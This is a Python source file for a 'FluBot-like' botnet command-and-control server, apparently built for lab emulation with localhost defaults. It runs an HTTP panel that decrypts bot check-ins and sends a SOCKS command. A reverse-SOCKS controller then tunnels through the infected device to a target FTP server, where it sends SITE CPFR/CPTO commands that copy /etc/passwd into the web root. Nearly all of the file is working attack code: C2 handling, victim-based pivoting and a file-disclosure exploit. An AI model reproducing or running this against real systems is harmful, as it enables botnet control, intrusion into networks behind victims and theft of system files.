from __future__ import annotations

import argparse
import socket
import struct
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

from flubot_proto import (
    HTTP_PATH,
    MAGIC,
    decode_http_request,
    encode_http_response,
    lab_rsa_key,
    pack_u16,
    recv_exact,
)


def log(message: str) -> None:
    print(f"[c2] {message}", flush=True)


class C2State:
    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.private_key = lab_rsa_key()
        self.command_sent = False

    @property
    def socks_command(self) -> str:
        return f"SOCKS,{self.args.advertise_host}:{self.args.control_port}"

    def response_for(self, payload: str) -> str:
        if payload.startswith("PREPING,"):
            return "NONE,"
        if payload.startswith("GET_INJECTS_LIST,"):
            return "com.android.chrome"
        if payload.startswith("PING,") and not self.command_sent:
            self.command_sent = True
            return self.socks_command
        return "NONE,"


class PanelHandler(BaseHTTPRequestHandler):
    server_version = "Apache"
    sys_version = ""

    def do_POST(self) -> None:
        if self.path != HTTP_PATH:
            self.send_error(404)
            return

        length = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(length)
        state: C2State = self.server.state  # type: ignore[attr-defined]

        try:
            decoded = decode_http_request(body, state.private_key)
            command = state.response_for(decoded.payload)
            encoded = encode_http_response(decoded.bot_id, decoded.session_key, command)
            log(f"HTTP {decoded.payload!r} -> {command!r} key={decoded.session_key}")
        except Exception as exc:
            log(f"bad HTTP request: {exc}")
            self.send_error(400)
            return

        self.send_response(200)
        self.send_header("Content-Length", str(len(encoded)))
        self.end_headers()
        self.wfile.write(encoded)

    def log_message(self, fmt: str, *args: object) -> None:
        return


def serve_http(state: C2State) -> None:
    server = ThreadingHTTPServer((state.args.bind_host, state.args.http_port), PanelHandler)
    server.state = state  # type: ignore[attr-defined]
    log(f"HTTP panel listening on {state.args.bind_host}:{state.args.http_port}{HTTP_PATH}")
    server.serve_forever()


def read_ftp_line(sock: socket.socket, timeout: float = 2.0) -> bytes:
    sock.settimeout(timeout)
    data = bytearray()
    try:
        while not data.endswith(b"\r\n"):
            chunk = sock.recv(1)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    finally:
        sock.settimeout(None)
    return bytes(data)


def ftp_exchange(tunnel: socket.socket, cmd: bytes) -> bytes:
    log(f"FTP command via victim: {cmd!r}")
    tunnel.sendall(cmd)
    response = read_ftp_line(tunnel)
    if response:
        log(f"FTP response via victim: {response!r}")
    time.sleep(0.15)
    return response


def drive_ftp_over_tunnel(tunnel: socket.socket, state: C2State) -> None:
    banner = read_ftp_line(tunnel)
    if banner:
        log(f"FTP banner via victim: {banner!r}")

    commands = [
        b"USER anonymous\r\n",
        b"PASS lab@example.com\r\n",
        b"SYST\r\n",
        b"PWD\r\n",
        f"SITE CPFR {state.args.ftp_exploit_source}\r\n".encode("ascii"),
        f"SITE CPTO {state.args.ftp_exploit_dest}\r\n".encode("ascii"),
        b"QUIT\r\n",
    ]
    for cmd in commands:
        ftp_exchange(tunnel, cmd)


def socks4_request(target_host: str, target_port: int, user_id: bytes) -> bytes:
    ip = socket.inet_aton(target_host)
    return b"\x04\x01" + struct.pack(">H", target_port) + ip + user_id + b"\x00"


def handle_control_connection(state: C2State, conn: socket.socket, addr: tuple[str, int]) -> None:
    with conn:
        log(f"control connection from {addr[0]}:{addr[1]}")
        magic = struct.unpack(">I", recv_exact(conn, 4))[0]
        bot_len = struct.unpack(">I", recv_exact(conn, 4))[0]
        bot_id = recv_exact(conn, bot_len).decode("utf-8", errors="replace")
        log(f"control hello magic={magic} bot_len={bot_len} bot_id={bot_id}")
        if magic != MAGIC:
            log("unexpected magic, closing control channel")
            return

        data_ready = threading.Event()
        data_holder: dict[str, socket.socket] = {}

        def data_listener() -> None:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
                listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                listener.bind((state.args.bind_host, state.args.data_port))
                listener.listen(1)
                log(f"SOCKS data listener on {state.args.bind_host}:{state.args.data_port}")
                data_ready.set()
                data_conn, data_addr = listener.accept()
                log(f"SOCKS data connection from {data_addr[0]}:{data_addr[1]}")
                data_holder["conn"] = data_conn

        thread = threading.Thread(target=data_listener, daemon=True)
        thread.start()
        data_ready.wait()

        conn.sendall(pack_u16(state.args.data_port))
        log(f"sent data_port={state.args.data_port} over control channel")

        while "conn" not in data_holder:
            time.sleep(0.05)

        data_conn = data_holder["conn"]
        with data_conn:
            request = socks4_request(
                state.args.target_host,
                state.args.target_port,
                state.args.socks_user.encode("ascii"),
            )
            data_conn.sendall(request)
            log(
                "sent SOCKS4 CONNECT "
                f"target={state.args.target_host}:{state.args.target_port} "
                f"bytes={request.hex(' ')}"
            )
            response = recv_exact(data_conn, 8)
            log(f"SOCKS4 response bytes={response.hex(' ')}")
            if response[:2] != b"\x00\x5a":
                log("SOCKS4 connect failed")
                return
            drive_ftp_over_tunnel(data_conn, state)


def serve_socks_control(state: C2State) -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((state.args.bind_host, state.args.control_port))
        listener.listen(5)
        log(f"SOCKS control listening on {state.args.bind_host}:{state.args.control_port}")
        while True:
            conn, addr = listener.accept()
            threading.Thread(target=handle_control_connection, args=(state, conn, addr), daemon=True).start()


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="FluBot-like HTTP C2 plus reverse SOCKS controller")
    parser.add_argument("--bind-host", default="0.0.0.0")
    parser.add_argument("--advertise-host", default="127.0.0.1")
    parser.add_argument("--http-port", type=int, default=80)
    parser.add_argument("--control-port", type=int, default=9000)
    parser.add_argument("--data-port", type=int, default=4444)
    parser.add_argument("--target-host", default="127.0.0.1")
    parser.add_argument("--target-port", type=int, default=2121)
    parser.add_argument("--socks-user", default="")
    parser.add_argument("--ftp-exploit-source", default="/etc/passwd")
    parser.add_argument("--ftp-exploit-dest", default="/var/www/html/pwned.txt")
    parser.add_argument("--private-key-out", default=None)
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    state = C2State(args)
    if args.private_key_out:
        private_path = Path(args.private_key_out)
        private_path.parent.mkdir(parents=True, exist_ok=True)
        private_path.write_bytes(state.private_key.export_key("PEM"))
        private_path.chmod(0o600)
        log(f"laboratory RSA private key exported to {private_path}")
    threading.Thread(target=serve_http, args=(state,), daemon=True).start()
    serve_socks_control(state)


if __name__ == "__main__":
    main()
